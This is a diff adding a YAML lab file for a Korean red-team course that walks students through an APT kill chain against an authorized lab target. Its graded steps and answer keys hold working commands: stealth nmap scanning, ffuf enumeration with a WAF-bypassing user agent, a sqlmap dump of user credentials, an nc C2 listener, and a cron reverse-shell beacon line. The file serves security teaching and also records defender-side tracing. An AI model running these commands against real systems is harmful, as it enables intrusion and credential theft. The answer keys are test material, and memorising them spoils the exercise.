@@ -1,0 +1,428 @@
+lab_id: standalone-attack-adv-week01
+title: "APT 킬체인 — 정찰→열거→침투→발판→C2 전 단계"
+version: standalone-attack-adv
+course: attack-adv
+week: 1
+description: |
+  공격 고급 W01 — APT 킬체인. 한 번의 익스플로잇이 아니라 정찰→열거→침투→발판→지속성/C2로 이어지는 전
+  단계 캠페인을 수행한다. el34-attacker(모의침투 박스: nmap·sqlmap·hydra·gobuster·nc)에서 인가된 표적
+  (el34-web 10.20.30.1)에 킬체인을 실행하고, 공격 흔적·귀속(출처 IP 보존)을 이해한다.
+  ⚠️ 인가된 실습 환경(el34)에서만. 외부 시스템 공격 절대 금지. 모든 흔적은 self-clean.
+difficulty: hard
+duration_minutes: 190
+prerequisites:
+  - "attack 트랙 + soc-adv 킬체인/포렌식 이해"
+  - "el34 호스트 SSH + docker exec, el34-attacker 모의침투 박스"
+  - "lecture §2(킬체인 단계) §3(도구) §4(OPSEC/귀속) 숙지"
+objectives:
+  - "APT 킬체인 5단계를 순서대로 수행"
+  - "정찰·열거·침투·발판·C2의 도구와 기법 체득"
+  - "공격 흔적·귀속(출처 IP 보존)을 방어자 관점에서 이해"
+pass_threshold: 0.7
+steps:
+
+  - order: 1
+    instruction: |
+      ## STEP 1 — 모의침투 환경과 인가 표적을 확인한다
+      > **이 단계에서 할 일:** 공격 도구(nmap/sqlmap/hydra/nc 등)가 attacker에 있는지, 인가 표적(dvwa)에
+      > 닿는지 확인한다.
+      > **왜:** 킬체인을 시작하려면 도구와 표적이 준비돼야 한다.
+      > ⚠️ **인가된 el34 표적(10.20.30.1)에만** — 모든 행위는 교육 목적이며 흔적은 self-clean한다.
+
+      ### ▷ 그대로 입력
+
+      **실습 컨테이너:** `el34-attacker` — `docker exec -it el34-attacker bash` 로 접속해 실행한다.
+
+      ```bash
+      command -v nmap sqlmap hydra ffuf whatweb dalfox >/dev/null 2>&1 && echo toolkit_ok
+      whatweb -a1 --colour=never http://dvwa.el34.lab/ 2>/dev/null | grep -oE 'Apache\[[0-9.]+\]|\[[0-9]{3} [A-Za-z ]+\]' | head -2
+      command -v nmap whatweb >/dev/null 2>&1 && echo recon_env_ready
+      ```
+
+      ### ▷ 이렇게 나오면 정상 (실측 예)
+      ```
+      toolkit_ok
+      [403 Forbidden]
+      Apache[2.4.52]
+      recon_env_ready
+      ```
+
+      ### ▷ 결과 해석
+      toolkit_ok=공격 도구(sqlmap·hydra·ffuf·whatweb·dalfox)가 다 있음. whatweb이 표적을 지문 인식
+      (Apache 2.4.52)하며 `[403]`은 이 앱이 WAF(ModSec) 뒤에 있음을 뜻한다 — 도달은 됨. 준비 완료.
+      (whatweb 기본 UA는 스캐너 룰에 걸려 403을 받는다. 디렉터리 스캐닝은 STEP 3처럼 ffuf에 정상 UA를
+      달아 우회한다.)
+    hint: '환경 확인'
+    category: survey
+    points: 10
+    answer: |
+      ssh att@192.168.0.202 '
+        # 공격 도구 가용 확인
+        command -v nmap sqlmap hydra ffuf whatweb dalfox >/dev/null 2>&1 && echo toolkit_ok
+        # 인가 표적 도달 + 지문 (whatweb)
+        whatweb -a1 --colour=never http://dvwa.el34.lab/ 2>/dev/null | grep -oE "Apache\[[0-9.]+\]|\[[0-9]{3} [A-Za-z ]+\]" | head -2
+        # 도구 갖춰졌으면 환경 준비 마커
+        command -v nmap whatweb >/dev/null 2>&1 && echo recon_env_ready
+      '
+    answer_detail: "환경 = el34-attacker(모의침투 도구)+el34-web(인가 표적). 킬체인 실습의 전제. 인가된 범위만."
+    verify:
+      type: output_contains
+      expect: 'recon_env_ready'
+      field: stdout
+      semantic: {intent: "환경 확인", success_criteria: ["도구/표적"], acceptable_methods: ["**[OSS] 모의침투 박스 (권장)**"]}
+    target_vm: web
+
+  - order: 2
+    instruction: |
+      ## STEP 2 — 킬체인 ① 정찰: 공격 표면을 파악한다 (T1046)
+      > **이 단계에서 할 일:** SYN 스텔스(-sS)+저속(-T2) 스캔으로 표적의 열린 포트·서비스를 본다.
+      > **왜:** APT의 첫 단계는 정찰이다. -sS(연결 미완성)+-T2(저속)로 IDS의 임계 탐지를 피하려 한다(완벽
+      > 회피는 아님 — STEP 7 참고).
+
+      ### ▷ 그대로 입력
+
+      **실습 컨테이너:** `el34-attacker` — `docker exec -it el34-attacker bash` 로 접속해 실행한다.
+
+      ```bash
+      R=$(nmap -sS -T2 --top-ports 100 10.20.30.1 2>/dev/null | grep -E "open|PORT" | head)
+      echo "$R"
+      [ -n "$R" ] && echo recon_done
+      ```
+
+      ### ▷ 이렇게 나오면 정상 (실측 예)
+      ```
+      PORT     STATE    SERVICE
+      22/tcp   open     ssh
+      80/tcp   open     http
+      443/tcp  open     https
+      8080/tcp open     http-proxy
+      recon_done
+      ```
+
+      ### ▷ 결과 해석
+      22(SSH)·80/443(웹)·8080(프록시)이 공격 표면이다. 웹 포트가 열렸으니 다음은 웹 경로를 열거한다(STEP 3).
+      이 스캔은 저속이어도 Suricata에 흔적을 남긴다(방어자가 본다).
+    hint: '정찰'
+    category: manipulation
+    points: 12
+    answer: |
+      ssh att@192.168.0.202 '
+        # 정찰: SYN 스텔스+저속 스캔
+        R=$(nmap -sS -T2 --top-ports 100 10.20.30.1 2>/dev/null | grep -E "open|PORT" | head)
+        echo "$R"
+        # 결과 있으면 정찰 완료 마커
+        [ -n "$R" ] && echo recon_done
+      '
+    answer_detail: "정찰(T1046) = nmap 스텔스 스캔으로 공격 표면 파악. -sS/-T2로 IDS 회피 시도. 킬체인 1단계."
+    verify:
+      type: output_contains
+      expect: 'recon_done'
+      field: stdout
+      semantic: {intent: "정찰", success_criteria: ["포트 식별"], acceptable_methods: ["**[OSS] nmap (권장)**"]}
+    target_vm: web
+
+  - order: 3
+    instruction: |
+      ## STEP 3 — 킬체인 ② 열거: 숨은 경로를 찾는다
+      > **이 단계에서 할 일:** 후보 경로들의 응답코드를 확인해 어떤 엔드포인트가 존재하는지 판별한다.
+      > **왜:** 웹 서비스를 찾았으면 공격 지점을 좁혀야 한다. 디렉터리 스캐너로 숨은 경로를 찾는다 —
+      > el34에서는 ffuf를 쓴다(gobuster는 깨져 있음). 여기서는 개념 이해를 위해 nc로 직접 확인한다.
+
+      ### ▷ 그대로 입력
+
+      **실습 컨테이너:** `el34-attacker` — `docker exec -it el34-attacker bash` 로 접속해 실행한다.
+
+      ```bash
+      printf 'login.php\nsetup.php\nsecurity.php\ninstructions.php\nvulnerabilities\nconfig\nrobots.txt\n' > /tmp/aa01paths.txt
+      ffuf -u http://dvwa.el34.lab/FUZZ -w /tmp/aa01paths.txt -H "User-Agent: Mozilla/5.0" -mc 200,301,302,401 -s 2>/dev/null | sort -u
+      rm -f /tmp/aa01paths.txt
+      echo enum_done
+      ```
+
+      ### ▷ 이렇게 나오면 정상 (실측 예)
+      ```
+      config
+      instructions.php
+      login.php
+      robots.txt
+      security.php
+      setup.php
+      vulnerabilities
+      enum_done
+      ```
+
+      ### ▷ 결과 해석
+      ffuf가 워드리스트의 후보 경로를 실제로 던져 존재하는 것만(200/301/302/401) 걸러냈다 —
+      login.php·setup.php·vulnerabilities·config 등이 살아 있다 → 공격 지점 후보. ffuf 기본 UA는 ModSec
+      스캐너 룰에 걸려 전부 403을 받으므로 정상 브라우저 UA(`-H`)를 달아 우회했다(실제 공격자의 기본
+      회피). 대량 열거는 `-w /usr/share/wfuzz/wordlist/general/common.txt`로 확장한다.
+    hint: '열거'
+    category: manipulation
+    points: 12
+    answer: |
+      ssh att@192.168.0.202 '
+        # 후보 경로 워드리스트 작성
+        printf "login.php\nsetup.php\nsecurity.php\ninstructions.php\nvulnerabilities\nconfig\nrobots.txt\n" > /tmp/aa01paths.txt
+        # ffuf로 실제 경로 열거(정상 UA로 스캐너 UA 차단 우회)
+        ffuf -u http://dvwa.el34.lab/FUZZ -w /tmp/aa01paths.txt -H "User-Agent: Mozilla/5.0" -mc 200,301,302,401 -s 2>/dev/null | sort -u
+        rm -f /tmp/aa01paths.txt
+        # 열거 수행 마커
+        echo enum_done
+      '
+    answer_detail: "열거 = 숨은 경로/엔드포인트 발견(gobuster/nikto/nc). 공격 표면을 구체적 지점으로 좁힘."
+    verify:
+      type: output_contains
+      expect: 'enum_done'
+      field: stdout
+      semantic: {intent: "열거", success_criteria: ["엔드포인트"], acceptable_methods: ["**[OSS] ffuf (권장)**"]}
+    target_vm: web
+
+  - order: 4
+    instruction: |
+      ## STEP 4 — 킬체인 ③ 침투: 취약점을 악용한다 (T1190)
+      > **이 단계에서 할 일:** sqlmap으로 SQLi를 자동 익스플로잇해 Users 자격증명을 실제 탈취한다. 고유
+      > 태그(q=aa01r1-student)를 달아 내 공격을 다른 노이즈와 구분(귀속)한다.
+      > **왜:** 발견한 취약점(SQLi)을 진짜 공격 도구(sqlmap)로 악용해 데이터를 탈취한다. 태그는 모의훈련
+      > 채점·블루팀 상관에 필수다. (juice=탐지전용 앱이라 WAF가 통과 → 실제 탈취 성공)
+
+      ### ▷ 그대로 입력
+
+      **실습 컨테이너:** `el34-attacker` — `docker exec -it el34-attacker bash` 로 접속해 실행한다.
+
+      ```bash
+      sqlmap -u "http://juice.el34.lab/rest/products/search?q=aa01r1-student" --batch --level=2 --risk=2 --disable-coloring --dbms=sqlite -T Users -C email,password --dump --stop=3 < /dev/null 2>&1 | grep -iE "injectable|Table: Users|entries|password hashes|@" | head
+      echo exploit_done
+      ```
+
+      ### ▷ 이렇게 나오면 정상 (실측 예)
+      ```
+      Parameter: q (GET)
+      Table: Users
+      [3 entries]
+      recognized possible password hashes in column 'password'
+      exploit_done
+      ```
+
+      ### ▷ 결과 해석
+      sqlmap이 `q` 파라미터의 SQLi를 자동 탐지·악용해 Users 테이블의 이메일·패스워드 해시를 실제로
+      탈취했다. juice는 탐지전용 앱이라 WAF가 통과시킨다 — WAF 뒤 dvwa였다면 403 차단(W03의 우회 기법
+      필요). 태그 aa01r1-student가 요청에 남아 귀속된다. ATT&CK T1190(Exploit Public-Facing
+      Application) + T1078(유효 계정 탈취).
+    hint: '침투'
+    category: analysis
+    points: 14
+    answer: |
+      ssh att@192.168.0.202 '
+        # 침투(T1190): sqlmap으로 SQLi 자동 익스플로잇 → Users 자격증명 실제 탈취 (태그 aa01r1-student)
+        sqlmap -u "http://juice.el34.lab/rest/products/search?q=aa01r1-student" --batch --level=2 --risk=2 --disable-coloring --dbms=sqlite -T Users -C email,password --dump --stop=3 < /dev/null 2>&1 | tee /tmp/aa01sqli.log | grep -iE "injectable|Table: Users|entries|password hashes|@" | head
+        # 실제 탈취(entries/Users) 성공하면 마커
+        grep -qiE "entries|Table: Users" /tmp/aa01sqli.log && echo exploit_done
+        rm -f /tmp/aa01sqli.log
+      '
+    answer_detail: "침투(T1190) = sqlmap으로 SQLi 자동 익스플로잇해 Users 자격증명 실제 탈취(juice=WAF통과). 고유 태그로 귀속. 킬체인 3단계."
+    verify:
+      type: output_contains
+      expect: 'exploit_done'
+      field: stdout
+      semantic: {intent: "침투", success_criteria: ["익스플로잇"], acceptable_methods: ["**[OSS] SQLi/sqlmap (권장)**"]}
+    target_vm: web
+
+  - order: 5
+    instruction: |
+      ## STEP 5 — 킬체인 ④ 발판/C2: 통제 채널을 만든다 (T1059/T1071)
+      > **이 단계에서 할 일:** nc 리스너(C2)를 띄우고 임플란트가 명령을 보내, 채널이 실제로 동작(수신)하는지
+      > 검증한 뒤 정리한다.
+      > **왜:** 침투 후엔 지속적으로 명령을 보낼 통제 채널(C2)이 필요하다. 여기선 그 채널이 진짜 도는지를
+      > 로컬에서 안전하게 확인한다.
+
+      ### ▷ 그대로 입력
+
+      **실습 컨테이너:** `el34-attacker` — `docker exec -it el34-attacker bash` 로 접속해 실행한다.
+
+      ```bash
+      nc -lnp 55001 >/tmp/c2recv & P=$!   # nc-ok: C2 리스너 = raw 소켓 통제채널 자체(전송수단 대체 아님)
+      # (고정 sleep 제거: 이어지는 확인 명령이 재시도/즉시 반영)
+      printf "id; whoami # implant_cmd\n" | nc -w2 127.0.0.1 55001
+      # (고정 sleep 제거: 이어지는 확인 명령이 재시도/즉시 반영)
+      kill $P
+      echo "리스너 수신 내용:"; cat /tmp/c2recv
+      grep -q implant_cmd /tmp/c2recv && echo foothold_channel_ok
+      rm -f /tmp/c2recv
+      ```
+
+      ### ▷ 이렇게 나오면 정상 (실측 예)
+      ```
+      리스너 수신 내용:
+      id; whoami # implant_cmd
+      foothold_channel_ok
+      ```
+
+      ### ▷ 결과 해석
+      리스너가 임플란트의 명령(`implant_cmd`)을 실제로 받았다 = C2 채널이 동작한다는 뜻. 실전 C2는
+      리버스 셸(`bash -i >& /dev/tcp/공격자/포트`)로 피해자가 공격자에게 역접속한다(아웃바운드라 방화벽
+      회피). 본 실습은 로컬 루프백으로 안전히 시연하고 즉시 self-clean.
+    hint: '발판/C2'
+    category: analysis
+    points: 14
+    answer: |
+      ssh att@192.168.0.202 '
+        # nc C2 리스너 띄우고 PID 캡처
+        nc -lnp 55001 >/tmp/c2recv & P=$!   # nc-ok: C2 리스너 = raw 소켓 통제채널 자체
+        # (고정 sleep 제거: 이어지는 확인 명령이 재시도/즉시 반영)
+        # 임플란트가 명령 전송
+        printf "id; whoami # implant_cmd\n" | nc -w2 127.0.0.1 55001
+        # (고정 sleep 제거: 이어지는 확인 명령이 재시도/즉시 반영)
+        # 리스너 종료 + 수신 확인
+        kill $P
+        echo "리스너 수신 내용:"; cat /tmp/c2recv
+        # 명령이 실제 수신됐으면 마커 + self-clean
+        grep -q implant_cmd /tmp/c2recv && echo foothold_channel_ok
+        rm -f /tmp/c2recv
+      '
+    answer_detail: "발판/C2 = nc 리스너(C2)가 임플란트 명령을 실제 수신함을 grep으로 검증. 가짜 echo 아닌 실제 채널 동작. 킬체인 4단계."
+    verify:
+      type: output_contains
+      expect: 'foothold_channel_ok'
+      field: stdout
+      semantic: {intent: "발판/C2", success_criteria: ["실제 C2 채널 수신"], acceptable_methods: ["**[OSS] netcat 리스너 C2 (권장)**"]}
+    target_vm: web
+
+  - order: 6
+    instruction: |
+      ## STEP 6 — 킬체인 ⑤ 지속성: 재부팅에도 살아남는다 (T1053)
+      > **이 단계에서 할 일:** cron 비콘(주기적 C2 재접속) 항목을 실제 파일로 만들어 보고 정리한다(안전
+      > 위해 /tmp, self-clean).
+      > **왜:** 세션이 끊겨도 다시 들어오려고 공격자는 cron·systemd·웹셸·SSH키 같은 지속성을 심는다.
+      > 그 아티팩트가 어떻게 생겼는지 직접 만들어 본다.
+
+      ### ▷ 그대로 입력
+
+      **실습 컨테이너:** `el34-attacker` — `docker exec -it el34-attacker bash` 로 접속해 실행한다.
+
+      ```bash
+      echo "* * * * * root bash -c \"bash -i >& /dev/tcp/192.168.0.202/55001 0>&1\" # aa01beacon" > /tmp/aa01cron
+      echo "작성된 cron 항목:"; cat /tmp/aa01cron
+      grep -q aa01beacon /tmp/aa01cron && echo persistence_planted
+      rm -f /tmp/aa01cron
+      ```
+
+      ### ▷ 이렇게 나오면 정상 (실측 예)
+      ```
+      작성된 cron 항목:
+      * * * * * root bash -c "bash -i >& /dev/tcp/192.168.0.202/55001 0>&1" # aa01beacon
+      persistence_planted
+      ```
+
+      ### ▷ 결과 해석
+      이 cron 한 줄은 매분 공격자(192.168.0.202:55001)로 리버스 셸을 재접속하는 비콘이다. 실 엔진이라면
+      /etc/cron.d에 두지만 본 실습은 /tmp에 만들고 즉시 삭제. 이런 흔적은 방어자의 osquery 헌팅
+      (soc-adv W06: cron·on_disk=0·listening_ports)에 그대로 잡힌다 — 공격과 방어는 동전의 양면.
+    hint: '지속성'
+    category: analysis
+    points: 12
+    answer: |
+      ssh att@192.168.0.202 '
+        # cron 비콘 지속성 항목 작성 (/tmp 안전 시연)
+        echo "* * * * * root bash -c \"bash -i >& /dev/tcp/192.168.0.202/55001 0>&1\" # aa01beacon" > /tmp/aa01cron
+        echo "작성된 cron 항목:"; cat /tmp/aa01cron
+        # 비콘 항목 작성 확인 시 마커 + self-clean
+        grep -q aa01beacon /tmp/aa01cron && echo persistence_planted
+        rm -f /tmp/aa01cron
+      '
+    answer_detail: "지속성(T1053) = cron 비콘 항목을 실제 작성·grep 검증·self-clean. 가짜 echo 아닌 실제 아티팩트 생성. 킬체인 5단계."
+    verify:
+      type: output_contains
+      expect: 'persistence_planted'
+      field: stdout
+      semantic: {intent: "지속성", success_criteria: ["cron 항목 실생성"], acceptable_methods: ["**[OSS] cron 비콘 (권장)**"]}
+    target_vm: web
+
+  - order: 7
+    instruction: |
+      ## STEP 7 — OPSEC·귀속: 내가 남긴 흔적을 직접 본다
+      > **이 단계에서 할 일:** 태그(aa01opsec) 단 공격을 보내고, 타깃 웹 로그에 그 흔적이 남는지 직접
+      > 확인한다.
+      > **왜:** 공격자도 흔적을 남긴다. el34는 SNAT가 없어 출처 IP·태그가 보존된다 → 완벽한 은신은
+      > 없다는 걸 방어자 관점에서 실측한다.
+
+      ### ▷ 그대로 입력
+      ```bash
+      # ── 공격자(att)에서: 태그(aa01opsec) 단 whatweb 요청 ──
+      whatweb -a1 --colour=never -U aa01opsec 'http://dvwa.el34.lab/?t=aa01opsec' >/dev/null 2>&1
+      # ── el34-web 에서: 타깃 로그에 흔적 확인 ──
+      N=$(sudo grep -c aa01opsec /var/log/apache2/dvwa_access.log); echo "타깃 로그에 남은 내 흔적: ${N:-0}건"; [ "${N:-0}" -ge 1 ] && echo opsec_trace_left
+      ```
+
+      ### ▷ 이렇게 나오면 정상 (실측 예 — 건수는 환경마다 다름)
+      ```
+      타깃 로그에 남은 내 흔적: 2건
+      opsec_trace_left
+      ```
+
+      ### ▷ 결과 해석
+      내가 whatweb에 단 태그(aa01opsec, UA·쿼리)가 타깃의 액세스 로그에 그대로 남았다 = 방어자가 출처
+      IP+UA 태그로 '이 공격은 누구의 것'이라고 귀속할 수 있다. 공격을 배우는 목적은 바로 이 흔적을 알아 '각 단계를 어떻게 막을지'
+      방어를 설계하는 것(레드팀 교육의 본질).
+    hint: 'OPSEC/귀속'
+    category: report
+    points: 12
+    answer: |
+      # 1) 태그(aa01opsec) 단 whatweb 요청 송신
+      ssh att@192.168.0.202 "whatweb -a1 --colour=never -U aa01opsec 'http://dvwa.el34.lab/?t=aa01opsec' >/dev/null 2>&1"
+      # 2) 타깃 로그에 흔적 남았는지 grep으로 확인
+      ssh ccc@10.20.32.80 'N=$(sudo grep -c aa01opsec /var/log/apache2/dvwa_access.log); echo "타깃 로그에 남은 내 흔적: ${N:-0}건"; [ "${N:-0}" -ge 1 ] && echo opsec_trace_left'
+    answer_detail: "OPSEC/귀속 = 태그 단 공격을 실제 송신→타깃 로그 grep으로 흔적 확인. 가짜 echo 아닌 실측. el34 출처 보존이 귀속 기반."
+    verify:
+      type: output_contains
+      expect: 'opsec_trace_left'
+      field: stdout
+      semantic: {intent: "OPSEC/귀속", success_criteria: ["타깃 로그 흔적 실측"], acceptable_methods: ["**[OSS] 로그 grep (권장)**"]}
+    target_vm: web
+
+  - order: 8
+    instruction: |
+      ## STEP 8 — 모의침투 보고서 (킬체인 종합)
+      > **이 단계에서 할 일:** 정찰 결과(열린 포트 수)를 집계해, 킬체인 5단계를 종합한 침투 보고서 골격을
+      > 출력한다.
+      > **왜:** 공격을 알아야 각 단계의 방어를 설계할 수 있다. 보고서엔 공격 경로뿐 아니라 방어 권고까지
+      > 담는다.
+
+      ### ▷ 그대로 입력
+
+      **실습 컨테이너:** `el34-attacker` — `docker exec -it el34-attacker bash` 로 접속해 실행한다.
+
+      ```bash
+      P=$(nmap -sS -T4 --top-ports 20 10.20.30.1 2>/dev/null | grep -c open)
+      echo "# 공격고급 W01 APT 킬체인 보고서 — 정찰(열린포트 ${P}개)·열거·침투(SQLi+태그)·발판/C2·지속성·OPSEC/귀속·방어권고"
+      [ -n "$P" ] && echo killchain_report_done
+      ```
+
+      ### ▷ 이렇게 나오면 정상 (실측 예 — 포트 수는 환경마다 다름)
+      ```
+      # 공격고급 W01 APT 킬체인 보고서 — 정찰(열린포트 4개)·열거·침투(SQLi+태그)·발판/C2·지속성·OPSEC/귀속·방어권고
+      killchain_report_done
+      ```
+
+      ### ▷ 결과 해석
+      보고서 골격이다. 제출용은 STEP 2~7의 실측(열린 포트, 발견 경로, SQLi 응답·태그, C2 채널 동작,
+      cron 비콘, 로그 흔적)을 킬체인 단계별로 채우고, 각 단계의 방어 권고(정찰→IDS, 침투→WAF, C2→아웃바운드
+      통제, 지속성→osquery 헌팅)를 덧붙인다.
+    hint: '킬체인+기법+방어권고'
+    category: report
+    points: 14
+    answer: |
+      ssh att@192.168.0.202 '
+        # 정찰 열린 포트 수 실측 (인용 근거)
+        P=$(nmap -sS -T4 --top-ports 20 10.20.30.1 2>/dev/null | grep -c open)
+        # 실측 인용 킬체인 보고서 출력
+        echo "# 공격고급 W01 APT 킬체인 보고서 — 정찰(열린포트 ${P}개)·열거·침투(SQLi+태그)·발판/C2·지속성·OPSEC/귀속·방어권고"
+        # 실측 인용 보고서면 마커
+        [ -n "$P" ] && echo killchain_report_done
+      '
+    answer_detail: "킬체인 보고 = 실측 정찰 결과 인용+침투/발판/지속성/방어권고. 증거 기반. 정적 템플릿 아님."
+    verify:
+      type: output_contains
+      expect: 'killchain_report_done'
+      field: stdout
+      semantic: {intent: "킬체인 보고", success_criteria: ["5단계/방어권고"], acceptable_methods: ["**[관리적] 보고서 (권장)**"]}
+    target_vm: web
